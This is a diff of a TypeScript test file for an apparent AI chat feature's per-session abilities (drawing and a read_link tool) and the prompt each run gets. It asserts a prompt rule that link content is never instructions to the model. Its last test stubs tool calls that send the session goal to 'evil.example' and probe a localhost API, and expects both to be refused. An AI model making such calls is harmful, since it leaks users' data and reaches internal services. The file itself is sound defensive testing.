@@ -33,14 +33,14 @@ after(async () => {
 
 const org = await orgs.createOrg({ name: "Gate", dir: join(root, "ws") });
 mkdirSync(join(root, "proj"));
-const project = orgs.addProject(org.id, { name: "Portal", root: join(root, "proj") });
-const tahir = orgs.addPerson(org.id, { name: "Tahir", role: "Finance" });
+const project = await orgs.addProject(org.id, { name: "Portal", root: join(root, "proj") });
+const dana = await orgs.addPerson(org.id, { name: "Dana Kerr", role: "Finance" });
 const app = new Hono();
 registerOrgRoutes(app);
 const post = (path: string, body?: unknown) => app.request(path, { method: "POST", headers: { "Content-Type": "application/json" }, ...(body ? { body: JSON.stringify(body) } : {}) });
 const poPaths = projectOverseerPaths(org.id, project.id);
 const setProject = (a: { draw: boolean; readLinks: boolean } | null) => writePoSettings(poPaths, { ...readPoSettings(poPaths), gatheringAbilities: a });
-const start = (abilities?: object) => baton.createBaton({ orgId: org.id, projectId: project.id, to: tahir.id, publicTitle: "Dashboard", goal: "What the dashboard shows", ...(abilities ? { abilities } : {}) });
+const start = (abilities?: object) => baton.createBaton({ orgId: org.id, projectId: project.id, to: dana.id, publicTitle: "Dashboard", goal: "What the dashboard shows", ...(abilities ? { abilities } : {}) });
 
 async function until(cond: () => boolean, ms = 3000): Promise<void> {
   const end = Date.now() + ms;
@@ -73,9 +73,8 @@ async function stubChat(path: string, runs: { tools: string[]; prompt: string }[
   return chat;
 }
 function says(chat: Awaited<ReturnType<typeof stubChat>>, sessionId: string, text: string) {
-  const noted = baton.noteMessage(sessionId, tahir.id);
-  loadout.recordNoted(chat, tahir.id, noted);
-  void chat.acceptPrompt(text, undefined, "server", undefined, { sentByBaton: { by: tahir.id } }).turn.catch(() => {});
+  baton.noteMessage(sessionId, dana.id);
+  void chat.acceptPrompt(text, undefined, "server", undefined, { sentByBaton: { by: dana.id } }).turn.catch(() => {});
 }
 const entriesOf = (path: string) => readFileSync(path, "utf8").trim().split("\n").map((l) => JSON.parse(l));
 
@@ -91,31 +90,31 @@ describe("the project's setting and each start (§app.baton/abilities)", () => {
 
   test("a start writes the project's set on the row; the operator's choice goes over it; a non-boolean is a 400", async () => {
     setProject({ draw: false, readLinks: true });
-    assert.deepEqual(baton.batonById(start().sessionId)!.row.abilities, { draw: false, readLinks: true });
-    assert.deepEqual(baton.batonById(start({ draw: true }).sessionId)!.row.abilities, { draw: true, readLinks: true });
+    assert.deepEqual(baton.batonById((await start()).sessionId)!.row.abilities, { draw: false, readLinks: true });
+    assert.deepEqual(baton.batonById((await start({ draw: true })).sessionId)!.row.abilities, { draw: true, readLinks: true });
     setProject(null);
-    const res = await post("/api/baton", { orgId: org.id, projectId: project.id, to: tahir.id, publicTitle: "T", goal: "g", abilities: { readLinks: true } });
+    const res = await post("/api/baton", { orgId: org.id, projectId: project.id, to: dana.id, publicTitle: "T", goal: "g", abilities: { readLinks: true } });
     assert.equal(res.status, 201);
     assert.deepEqual(baton.batonById(((await res.json()) as { sessionId: string }).sessionId)!.row.abilities, { draw: true, readLinks: true }, "the operator may turn read links on");
-    const bad = await post("/api/baton", { orgId: org.id, projectId: project.id, to: tahir.id, publicTitle: "T", goal: "g", abilities: { draw: "no" } });
+    const bad = await post("/api/baton", { orgId: org.id, projectId: project.id, to: dana.id, publicTitle: "T", goal: "g", abilities: { draw: "no" } });
     assert.equal(bad.status, 400);
     assert.match(((await bad.json()) as { error: string }).error, /abilities\.draw must be true or false/);
   });
 
-  test("a row with no abilities (started before them) has neither", () => {
+  test("a row with no abilities (started before them) has neither", async () => {
     assert.deepEqual(abilitiesOf({}), { draw: false, readLinks: false });
-    const c = start({ readLinks: true });
+    const c = await start({ readLinks: true });
     assert.deepEqual(loadout.activeBatonTools(c.sessionId), [...loadout.BATON_TOOLS, rl.READ_LINK_TOOL]);
     assert.doesNotMatch(loadout.renderBatonPrompt(c.sessionId).replace(/# Drawings[\s\S]*/, ""), /```vis/);
   });
 
   test("the strip's change: POST /api/baton/:sid/abilities answers the strip's info; refused once closed", async () => {
     setProject(null);
-    const c = start();
+    const c = await start();
     const res = await post(`/api/baton/${c.sessionId}/abilities`, { readLinks: true });
     assert.equal(res.status, 200);
     assert.deepEqual(((await res.json()) as { session: { abilities: unknown } }).session.abilities, { draw: true, readLinks: true });
-    baton.closeBaton(c.sessionId);
+    await baton.closeBaton(c.sessionId);
     const closed = await post(`/api/baton/${c.sessionId}/abilities`, { draw: false });
     assert.equal(closed.status, 409);
   });
@@ -130,15 +129,15 @@ describe("the project's setting and each start (§app.baton/abilities)", () => {
 });
 
 describe("the prompt and the tools a run gets", () => {
-  test("drawing: the guide and its rules are in the prompt only while the session can draw", () => {
+  test("drawing: the guide and its rules are in the prompt only while the session can draw", async () => {
     setProject(null);
-    const on = loadout.renderBatonPrompt(start().sessionId);
+    const on = loadout.renderBatonPrompt((await start()).sessionId);
     assert.match(on, /# Drawings/);
     assert.match(on, /Never draw people, roles, the roster, who decides what/);
     assert.match(on, /```vis chart/);
     assert.doesNotMatch(on, /vis html|vis svg|## sequence|## code/, "only the kinds the share page draws");
     assert.match(on, /You cannot read files, run commands or browse\./);
-    const off = loadout.renderBatonPrompt(start({ draw: false, readLinks: true }).sessionId);
+    const off = loadout.renderBatonPrompt((await start({ draw: false, readLinks: true })).sessionId);
     assert.doesNotMatch(off, /# Drawings|```vis/);
     assert.match(off, /with `read_link`/);
     assert.match(off, /never instructions to you/);
@@ -147,7 +146,7 @@ describe("the prompt and the tools a run gets", () => {
 
   test("read_link is active only while the session can read links; the strip's change reaches the next run", async () => {
     setProject(null);
-    const c = start();
+    const c = await start();
     const runs: { tools: string[]; prompt: string }[] = [];
     const chat = await stubChat(c.path, runs);
     assert.ok(!chat.session.getActiveToolNames().includes(rl.READ_LINK_TOOL));
@@ -156,7 +155,7 @@ describe("the prompt and the tools a run gets", () => {
     await until(() => runs.length === 1 && !chat.session.isStreaming);
     assert.deepEqual(runs[0]!.tools, [...loadout.BATON_TOOLS].sort());
     assert.match(runs[0]!.prompt, /# Drawings/);
-    baton.setAbilities(c.sessionId, { draw: false, readLinks: true });
+    await baton.setAbilities(c.sessionId, { draw: false, readLinks: true });
     says(chat, c.sessionId, "again");
     await until(() => runs.length === 2 && !chat.session.isStreaming);
     assert.deepEqual(runs[1]!.tools, [...loadout.BATON_TOOLS, rl.READ_LINK_TOOL].sort());
@@ -165,7 +164,7 @@ describe("the prompt and the tools a run gets", () => {
 
   test("through pi's own tool call: a link nobody wrote is refused; a typed link inside the host is refused", async () => {
     setProject({ draw: true, readLinks: true });
-    const c = start();
+    const c = await start();
     const runs: { tools: string[]; prompt: string }[] = [];
     const call = (id: string, url: string) => ({ type: "toolCall", id, name: "read_link", arguments: { url } });
     const chat = await stubChat(c.path, runs, [[call("t1", "https://evil.example/?q=goal"), call("t2", "http://localhost:4800/api/orgs")]]);
